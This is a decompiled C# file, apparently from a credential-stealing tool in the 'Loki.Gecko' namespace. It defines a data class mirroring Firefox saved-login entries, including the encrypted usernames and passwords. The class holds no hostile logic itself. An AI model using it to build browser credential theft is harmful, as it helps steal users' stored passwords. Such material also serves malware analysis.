using System;

namespace Loki.Gecko
{
	// Token: 0x02000008 RID: 8
	public class DataSettings
	{
		// Token: 0x17000007 RID: 7
		// (get) Token: 0x0600002A RID: 42 RVA: 0x00003F2C File Offset: 0x0000212C
		// (set) Token: 0x0600002B RID: 43 RVA: 0x00003F34 File Offset: 0x00002134
		public int Id { get; set; }

		// Token: 0x17000008 RID: 8
		// (get) Token: 0x0600002C RID: 44 RVA: 0x00003F3D File Offset: 0x0000213D
		// (set) Token: 0x0600002D RID: 45 RVA: 0x00003F45 File Offset: 0x00002145
		public string Hostname { get; set; }

		// Token: 0x17000009 RID: 9
		// (get) Token: 0x0600002E RID: 46 RVA: 0x00003F4E File Offset: 0x0000214E
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00003F56 File Offset: 0x00002156
		public object HttpRealm { get; set; }

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x06000030 RID: 48 RVA: 0x00003F5F File Offset: 0x0000215F
		// (set) Token: 0x06000031 RID: 49 RVA: 0x00003F67 File Offset: 0x00002167
		public string FormSubmitURL { get; set; }

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000032 RID: 50 RVA: 0x00003F70 File Offset: 0x00002170
		// (set) Token: 0x06000033 RID: 51 RVA: 0x00003F78 File Offset: 0x00002178
		public string UsernameField { get; set; }

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000034 RID: 52 RVA: 0x00003F81 File Offset: 0x00002181
		// (set) Token: 0x06000035 RID: 53 RVA: 0x00003F89 File Offset: 0x00002189
		public string PasswordField { get; set; }

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000036 RID: 54 RVA: 0x00003F92 File Offset: 0x00002192
		// (set) Token: 0x06000037 RID: 55 RVA: 0x00003F9A File Offset: 0x0000219A
		public string EncryptedUsername { get; set; }

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00003FA3 File Offset: 0x000021A3
		// (set) Token: 0x06000039 RID: 57 RVA: 0x00003FAB File Offset: 0x000021AB
		public string EncryptedPassword { get; set; }

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00003FB4 File Offset: 0x000021B4
		// (set) Token: 0x0600003B RID: 59 RVA: 0x00003FBC File Offset: 0x000021BC
		public string Guid { get; set; }

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00003FC5 File Offset: 0x000021C5
		// (set) Token: 0x0600003D RID: 61 RVA: 0x00003FCD File Offset: 0x000021CD
		public int EncType { get; set; }

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600003E RID: 62 RVA: 0x00003FD6 File Offset: 0x000021D6
		// (set) Token: 0x0600003F RID: 63 RVA: 0x00003FDE File Offset: 0x000021DE
		public long TimeCreated { get; set; }

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x06000040 RID: 64 RVA: 0x00003FE7 File Offset: 0x000021E7
		// (set) Token: 0x06000041 RID: 65 RVA: 0x00003FEF File Offset: 0x000021EF
		public long TimeLastUsed { get; set; }

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000042 RID: 66 RVA: 0x00003FF8 File Offset: 0x000021F8
		// (set) Token: 0x06000043 RID: 67 RVA: 0x00004000 File Offset: 0x00002200
		public long TimePasswordChanged { get; set; }

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000044 RID: 68 RVA: 0x00004009 File Offset: 0x00002209
		// (set) Token: 0x06000045 RID: 69 RVA: 0x00004011 File Offset: 0x00002211
		public int TimesUsed { get; set; }
	}
}
